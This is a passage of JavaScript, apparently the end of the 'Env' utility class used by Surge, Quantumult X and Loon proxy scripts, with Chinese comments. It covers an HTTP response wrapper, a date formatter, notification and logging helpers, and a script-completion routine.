        this.got[method](url, _opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => {
            const { message: error, response: resp } = err;
            callback(error, resp, resp && resp.body);
          }
        );
      }
    }
    /**
     *
     * 示例:$.time('yyyy-MM-dd qq HH:mm:ss.S')
     *    :$.time('yyyyMMddHHmmssS')
     *    y:年 M:月 d:日 q:季 H:时 m:分 s:秒 S:毫秒
     *    其中y可选0-4位占位符、S可选0-1位占位符，其余可选0-2位占位符
     * @param {string} fmt 格式化参数
     * @param {number} 可选: 根据指定时间戳返回格式化日期
     *
     */
    time(fmt, ts = null) {
      const date = ts ? new Date(ts) : new Date();
      let o = {
        'M+': date.getMonth() + 1,
        'd+': date.getDate(),
        'H+': date.getHours(),
        'm+': date.getMinutes(),
        's+': date.getSeconds(),
        'q+': Math.floor((date.getMonth() + 3) / 3),
        S: date.getMilliseconds(),
      };
      if (/(y+)/.test(fmt))
        fmt = fmt.replace(
          RegExp.$1,
          (date.getFullYear() + '').substr(4 - RegExp.$1.length)
        );
      for (let k in o)
        if (new RegExp('(' + k + ')').test(fmt))
          fmt = fmt.replace(
            RegExp.$1,
            RegExp.$1.length == 1
              ? o[k]
              : ('00' + o[k]).substr(('' + o[k]).length)
          );
      return fmt;
    }

    /**
     * 系统通知
     *
     * > 通知参数: 同时支持 QuanX 和 Loon 两种格式, EnvJs根据运行环境自动转换, Surge 环境不支持多媒体通知
     *
     * 示例:
     * $.msg(title, subt, desc, 'twitter://')
     * $.msg(title, subt, desc, { 'open-url': 'twitter://', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
     * $.msg(title, subt, desc, { 'open-url': 'https://bing.com', 'media-url': 'https://github.githubassets.com/images/modules/open_graph/github-mark.png' })
     *
     * @param {*} title 标题
     * @param {*} subt 副标题
     * @param {*} desc 通知详情
     * @param {*} opts 通知参数
     *
     */
    msg(title = name, subt = '', desc = '', opts) {
      const toEnvOpts = (rawOpts) => {
        if (!rawOpts) return rawOpts;
        if (typeof rawOpts === 'string') {
          if (this.isLoon()) return rawOpts;
          else if (this.isQuanX()) return { 'open-url': rawOpts };
          else if (this.isSurge()) return { url: rawOpts };
          else return undefined;
        } else if (typeof rawOpts === 'object') {
          if (this.isLoon()) {
            let openUrl = rawOpts.openUrl || rawOpts.url || rawOpts['open-url'];
            let mediaUrl = rawOpts.mediaUrl || rawOpts['media-url'];
            return { openUrl, mediaUrl };
          } else if (this.isQuanX()) {
            let openUrl = rawOpts['open-url'] || rawOpts.url || rawOpts.openUrl;
            let mediaUrl = rawOpts['media-url'] || rawOpts.mediaUrl;
            let updatePasteboard =
              rawOpts['update-pasteboard'] || rawOpts.updatePasteboard;
            return {
              'open-url': openUrl,
              'media-url': mediaUrl,
              'update-pasteboard': updatePasteboard,
            };
          } else if (this.isSurge()) {
            let openUrl = rawOpts.url || rawOpts.openUrl || rawOpts['open-url'];
            return { url: openUrl };
          }
        } else {
          return undefined;
        }
      };
      if (!this.isMute) {
        if (this.isSurge() || this.isLoon()) {
          $notification.post(title, subt, desc, toEnvOpts(opts));
        } else if (this.isQuanX()) {
          $notify(title, subt, desc, toEnvOpts(opts));
        }
      }
      if (!this.isMuteLog) {
        let logs = ['', '==============📣系统通知📣=============='];
        logs.push(title);
        subt ? logs.push(subt) : '';
        desc ? logs.push(desc) : '';
        console.log(logs.join('\n'));
        this.logs = this.logs.concat(logs);
      }
    }

    log(...logs) {
      if (logs.length > 0) {
        this.logs = [...this.logs, ...logs];
      }
      console.log(logs.join(this.logSeparator));
    }

    logErr(err, msg) {
      const isPrintSack = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      if (!isPrintSack) {
        this.log('', `❗️${this.name}, 错误!`, err);
      } else {
        this.log('', `❗️${this.name}, 错误!`, err.stack);
      }
    }

    wait(time) {
      return new Promise((resolve) => setTimeout(resolve, time));
    }

    done(val = {}) {
      const endTime = new Date().getTime();
      const costTime = (endTime - this.startTime) / 1000;
      this.log('', `🔔${this.name}, 结束! 🕛 ${costTime} 秒`);
      this.log();
      if (this.isSurge() || this.isQuanX() || this.isLoon()) {
        $done(val);
      }
    }
  })(name, opts);
}
